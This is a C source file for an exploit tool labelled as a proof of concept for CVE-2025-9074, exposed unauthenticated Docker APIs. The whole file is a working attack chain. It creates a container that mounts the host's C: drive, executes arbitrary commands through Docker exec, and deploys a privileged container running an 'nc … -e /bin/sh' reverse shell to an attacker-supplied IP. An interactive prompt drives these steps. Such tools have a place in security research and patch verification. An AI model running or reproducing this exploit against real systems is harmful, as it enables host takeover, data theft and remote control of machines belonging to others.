#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// terminal colors
#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[1;31m"
#define COLOR_GREEN   "\033[1;32m"
#define COLOR_YELLOW  "\033[1;33m"
#define COLOR_BLUE    "\033[1;34m"
#define COLOR_MAGENTA "\033[1;35m"
#define COLOR_CYAN    "\033[1;36m"
#define COLOR_WHITE   "\033[1;37m"

char target_host[256] = "127.0.0.1";
char target_port[16] = "2375";
char container_id[128] = "";
char image_name[64] = "alpine";

// prototypes
void enable_ansi_colors();
void print_banner();
int check_docker_api();
int pull_image();
int create_container();
int start_container();
char* http_request(const char* method, const char* path, const char* body);
void interactive_shell();
void execute_command(const char* cmd);
void reverse_shell(const char* attacker_ip, const char* attacker_port);
void print_success(const char* msg);
void print_error(const char* msg);
void print_info(const char* msg);
void print_warning(const char* msg);

void enable_ansi_colors() {
    
}

void print_success(const char* msg) {
    printf("%s[✓]%s %s\n", COLOR_GREEN, COLOR_RESET, msg);
}

void print_error(const char* msg) {
    printf("%s[✗]%s %s\n", COLOR_RED, COLOR_RESET, msg);
}

void print_info(const char* msg) {
    printf("%s[*]%s %s\n", COLOR_CYAN, COLOR_RESET, msg);
}

void print_warning(const char* msg) {
    printf("%s[!]%s %s\n", COLOR_YELLOW, COLOR_RESET, msg);
}

void print_banner() {
    printf("%s", COLOR_MAGENTA);
    printf("\n");
    printf("                       _______________   ________   .________  ________________________  _____  \n");
    printf("______   ____   ____   \\_____  \\   _  \\  \\_____  \\  |   ____/ /   __   \\   _  \\______  \\/  |  | \n");
    printf("\\____ \\ /  _ \\_/ ___\\   /  ____/  /_\\  \\  /  ____/  |____  \\  \\____    /  /_\\  \\  /    /   |  |_\n");
    printf("|  |_> >  <_> )  \\___  /       \\  \\_/   \\/       \\  /       \\    /    /\\  \\_/   \\/    /    ^   /\\\n");
    printf("|   __/ \\____/ \\___  > \\_______ \\_____  /\\_______ \\/______  /   /____/  \\_____  /____/\\____   |\n");
    printf("|__|               \\/          \\/     \\/         \\/       \\/                  \\/           |__| \n");
    printf("%s", COLOR_RESET);
    printf("%s                    Docker API Unauthenticated Access Exploit%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s                           CVE-2025-9074 PoC Tool%s\n", COLOR_YELLOW, COLOR_RESET);
    printf("%s                              by xwpd%s\n\n", COLOR_WHITE, COLOR_RESET);
}

char* http_request(const char* method, const char* path, const char* body) {
    int s;
    struct sockaddr_in server;
    char request[8192];
    static char response[65536];
    int recv_size;

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return NULL;
    }

    server.sin_addr.s_addr = inet_addr(target_host);
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(target_port));

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(s);
        return NULL;
    }

    if (body != NULL && strlen(body) > 0) {
        sprintf(request,
            "%s %s HTTP/1.1\r\n"
            "Host: %s:%s\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %d\r\n"
            "Connection: close\r\n"
            "\r\n"
            "%s",
            method, path, target_host, target_port, (int)strlen(body), body);
    } else {
        sprintf(request,
            "%s %s HTTP/1.1\r\n"
            "Host: %s:%s\r\n"
            "Connection: close\r\n"
            "\r\n",
            method, path, target_host, target_port);
    }

    if (send(s, request, strlen(request), 0) < 0) {
        close(s);
        return NULL;
    }

    memset(response, 0, sizeof(response));
    int total = 0;
    while ((recv_size = recv(s, response + total, sizeof(response) - total - 1, 0)) > 0) {
        total += recv_size;
    }

    close(s);

    return response;
}

int check_docker_api() {
    print_info("Checking Docker API availability...");
    
    char* response = http_request("GET", "/info", NULL);
    
    if (response == NULL) {
        print_error("Failed to connect to Docker API");
        return 0;
    }

    if (strstr(response, "ServerVersion") != NULL) {
        print_success("Connection successful! Exposed Docker API detected");
        print_warning("CVE-2025-9074 vulnerability found on target");
        return 1;
    }

    print_error("API does not appear to be Docker Engine API");
    return 0;
}

int pull_image() {
    char path[512];
    sprintf(path, "/images/create?fromImage=%s&tag=latest", image_name);
    
    printf("%s[~]%s Pulling image '%s'...\n", COLOR_YELLOW, COLOR_RESET, image_name);
    
    char* response = http_request("POST", path, NULL);
    
    if (response == NULL) {
        print_error("Failed to pull image");
        return 0;
    }

    if (strstr(response, "Pull complete") || strstr(response, "already exists") || 
        strstr(response, "up to date")) {
        print_success("Image pulled successfully");
        return 1;
    }

    print_warning("Image probably already exists on daemon");
    return 1;
}

int create_container() {
    char payload[2048];
    sprintf(payload,
        "{"
        "\"Image\":\"%s\","
        "\"Cmd\":[\"/bin/sh\"],"
        "\"Tty\":true,"
        "\"HostConfig\":{"
            "\"Mounts\":[{"
                "\"Type\":\"bind\","
                "\"Source\":\"/run/desktop/mnt/host/c/\","
                "\"Target\":\"/mnt\""
            "}]"
        "}"
        "}", image_name);

    print_info("Creating malicious container...");
    
    char* response = http_request("POST", "/containers/create", payload);
    
    if (response == NULL) {
        print_error("Failed to create container");
        return 0;
    }

    char* id_start = strstr(response, "\"Id\":\"");
    if (id_start) {
        id_start += 6;
        char* id_end = strchr(id_start, '\"');
        if (id_end) {
            int len = id_end - id_start;
            if (len > 12) len = 12;
            strncpy(container_id, id_start, len);
            container_id[len] = '\0';
            
            printf("%s[✓]%s Container created: %s%s%s\n", 
                   COLOR_GREEN, COLOR_RESET, COLOR_CYAN, container_id, COLOR_RESET);
            return 1;
        }
    }

    print_error("Could not retrieve container ID");
    return 0;
}

int start_container() {
    char path[256];
    sprintf(path, "/containers/%s/start", container_id);
    
    print_info("Starting container...");
    
    char* response = http_request("POST", path, NULL);
    
    if (response == NULL) {
        print_error("Failed to start container");
        return 0;
    }

    print_success("Container started successfully!");
    return 1;
}

void execute_command(const char* cmd) {
    if (strlen(container_id) == 0) {
        print_error("No active container. Run the exploit first.");
        return;
    }

    // create exec in container
    char exec_payload[2048];
    sprintf(exec_payload,
        "{"
        "\"AttachStdin\":false,"
        "\"AttachStdout\":true,"
        "\"AttachStderr\":true,"
        "\"Tty\":false,"
        "\"Cmd\":[\"/bin/sh\",\"-c\",\"%s\"]"
        "}", cmd);

    char create_exec_path[256];
    sprintf(create_exec_path, "/containers/%s/exec", container_id);
    
    char* create_response = http_request("POST", create_exec_path, exec_payload);
    
    if (create_response == NULL) {
        print_error("Failed to create exec instance");
        return;
    }

    char exec_id[128] = "";
    char* id_start = strstr(create_response, "\"Id\":\"");
    if (id_start) {
        id_start += 6;
        char* id_end = strchr(id_start, '\"');
        if (id_end) {
            int len = id_end - id_start;
            strncpy(exec_id, id_start, len);
            exec_id[len] = '\0';
        }
    }

    if (strlen(exec_id) == 0) {
        print_error("Could not retrieve exec ID");
        return;
    }

    // run it
    char start_exec_payload[] = "{\"Detach\":false,\"Tty\":false}";
    char start_exec_path[256];
    sprintf(start_exec_path, "/exec/%s/start", exec_id);
    
    char* exec_response = http_request("POST", start_exec_path, start_exec_payload);
    
    if (exec_response == NULL) {
        print_error("Failed to execute command");
        return;
    }

    // skip headers and parse output
    char* body = strstr(exec_response, "\r\n\r\n");
    if (body) {
        body += 4;
        printf("\n%s", COLOR_GREEN);
        printf("┌─────────────────────────────────────────────────────────────┐\n");
        printf("│ Command Output%s\n", COLOR_RESET);
        printf("%s└─────────────────────────────────────────────────────────────┘%s\n", COLOR_GREEN, COLOR_RESET);
        
        // docker sends 8 byte headers, skip them
        while (*body) {
            if ((unsigned char)*body <= 2) {  // Stream type
                body += 8;  // Skip header
                int i = 0;
                while (body[i] && body[i] != 1 && body[i] != 2) {
                    putchar(body[i]);
                    i++;
                }
                body += i;
            } else {
                putchar(*body);
                body++;
            }
        }
        printf("\n%s─────────────────────────────────────────────────────────────%s\n", COLOR_GREEN, COLOR_RESET);
    }
}

void reverse_shell(const char* attacker_ip, const char* attacker_port) {
    char payload[2048];
    sprintf(payload,
        "{"
        "\"Image\":\"%s:latest\","
        "\"Cmd\":[\"/bin/sh\",\"-c\",\"nc %s %s -e /bin/sh\"],"
        "\"HostConfig\":{"
            "\"Binds\":[\"/run/desktop/mnt/host/c:/hostc\"],"
            "\"Privileged\":true"
        "}"
        "}", image_name, attacker_ip, attacker_port);

    printf("%s[~]%s Setting up reverse shell to %s:%s...\n", 
           COLOR_YELLOW, COLOR_RESET, attacker_ip, attacker_port);
    
    char* response = http_request("POST", "/containers/create", payload);
    
    if (response == NULL) {
        print_error("Failed to create reverse shell container");
        return;
    }

    char revshell_id[128] = "";
    char* id_start = strstr(response, "\"Id\":\"");
    if (id_start) {
        id_start += 6;
        char* id_end = strchr(id_start, '\"');
        if (id_end) {
            int len = id_end - id_start;
            if (len > 12) len = 12;
            strncpy(revshell_id, id_start, len);
            revshell_id[len] = '\0';
        }
    }

    if (strlen(revshell_id) == 0) {
        print_error("Could not retrieve container ID");
        return;
    }

    // start the container
    char start_path[256];
    sprintf(start_path, "/containers/%s/start", revshell_id);
    http_request("POST", start_path, NULL);

    print_success("Reverse shell deployed successfully!");
    printf("%s[*]%s Make sure you have a listener running: %snc -lvnp %s%s\n", 
           COLOR_CYAN, COLOR_RESET, COLOR_GREEN, attacker_port, COLOR_RESET);
}

void interactive_shell() {
    char input[512];
    char command[512];
    
    printf("\n%s╔══════════════════════════════════════════════════════════════╗%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s║%s            Interactive PoC Shell Activated                 %s║%s\n", COLOR_CYAN, COLOR_RESET, COLOR_CYAN, COLOR_RESET);
    printf("%s╚══════════════════════════════════════════════════════════════╝%s\n\n", COLOR_CYAN, COLOR_RESET);
    
    print_info("Available commands:");
    printf("  %scmd <command>%s        - Execute command in container\n", COLOR_YELLOW, COLOR_RESET);
    printf("  %srevshell <ip> <port>%s - Deploy reverse shell\n", COLOR_YELLOW, COLOR_RESET);
    printf("  %sinfo%s                 - Show container information\n", COLOR_YELLOW, COLOR_RESET);
    printf("  %sexit%s                 - Exit interactive shell\n", COLOR_YELLOW, COLOR_RESET);
    printf("\n");

    while (1) {
        printf("%s(PoC-CVE-2025-9074)>%s ", COLOR_MAGENTA, COLOR_RESET);
        
        if (fgets(input, sizeof(input), stdin) == NULL) {
            break;
        }

        // remove newline
        input[strcspn(input, "\n")] = 0;
        
        if (strlen(input) == 0) {
            continue;
        }

        if (strcmp(input, "exit") == 0) {
            print_info("Exiting interactive shell...");
            break;
        }

        if (strncmp(input, "cmd ", 4) == 0) {
            execute_command(input + 4);
            printf("\n");
        }
        else if (strncmp(input, "revshell ", 9) == 0) {
            char ip[64], port[16];
            if (sscanf(input + 9, "%s %s", ip, port) == 2) {
                reverse_shell(ip, port);
            } else {
                print_error("Usage: revshell <ip> <port>");
            }
            printf("\n");
        }
        else if (strcmp(input, "info") == 0) {
            printf("%sTarget:%s %s:%s\n", COLOR_CYAN, COLOR_RESET, target_host, target_port);
            printf("%sContainer ID:%s %s\n", COLOR_CYAN, COLOR_RESET, 
                   strlen(container_id) > 0 ? container_id : "Not available");
            printf("%sImage:%s %s\n\n", COLOR_CYAN, COLOR_RESET, image_name);
        }
        else {
            print_error("Unknown command. Use 'cmd', 'revshell', 'info' or 'exit'");
        }
    }
}

int main(int argc, char *argv[]) {
    enable_ansi_colors();
    print_banner();

    // target from args or prompt
    if (argc > 1) {
        char* colon = strchr(argv[1], ':');
        if (colon) {
            *colon = '\0';
            strcpy(target_host, argv[1]);
            strcpy(target_port, colon + 1);
        } else {
            strcpy(target_host, argv[1]);
        }
    } else {
        char input[256];
        printf("%sEnter target (host:port) [127.0.0.1:2375]: %s", COLOR_CYAN, COLOR_RESET);
        fgets(input, sizeof(input), stdin);
        input[strcspn(input, "\n")] = 0;
        
        if (strlen(input) > 0) {
            char* colon = strchr(input, ':');
            if (colon) {
                *colon = '\0';
                strcpy(target_host, input);
                strcpy(target_port, colon + 1);
            } else {
                strcpy(target_host, input);
            }
        }
    }

    printf("\n%s[→]%s Target: %s%s:%s%s\n\n", 
           COLOR_BLUE, COLOR_RESET, COLOR_YELLOW, target_host, target_port, COLOR_RESET);

    // exploit chain
    printf("%s═══════════════════════════════════════════════════════════════%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s                  PHASE 1: Initial Verification%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s═══════════════════════════════════════════════════════════════%s\n\n", COLOR_CYAN, COLOR_RESET);
    
    if (!check_docker_api()) {
        print_error("Target is not vulnerable or not accessible");
        return 1;
    }

    printf("\n%s═══════════════════════════════════════════════════════════════%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s                  PHASE 2: Image Preparation%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s═══════════════════════════════════════════════════════════════%s\n\n", COLOR_CYAN, COLOR_RESET);
    
    if (!pull_image()) {
        print_warning("Continuing anyway...");
    }

    printf("\n%s═══════════════════════════════════════════════════════════════%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s                  PHASE 3: Container Creation%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s═══════════════════════════════════════════════════════════════%s\n\n", COLOR_CYAN, COLOR_RESET);
    
    if (!create_container()) {
        print_error("Could not create malicious container");
        return 1;
    }

    printf("\n%s═══════════════════════════════════════════════════════════════%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s                  PHASE 4: Starting Container%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s═══════════════════════════════════════════════════════════════%s\n\n", COLOR_CYAN, COLOR_RESET);
    
    if (!start_container()) {
        print_error("Could not start container");
        return 1;
    }

    printf("\n%s═══════════════════════════════════════════════════════════════%s\n", COLOR_GREEN, COLOR_RESET);
    printf("%s              Exploitation Completed Successfully!%s\n", COLOR_GREEN, COLOR_RESET);
    printf("%s═══════════════════════════════════════════════════════════════%s\n", COLOR_GREEN, COLOR_RESET);

    // interactive shell
    interactive_shell();

    printf("\n%s[*]%s PoC finished. See you!\n", COLOR_CYAN, COLOR_RESET);
    return 0;
}
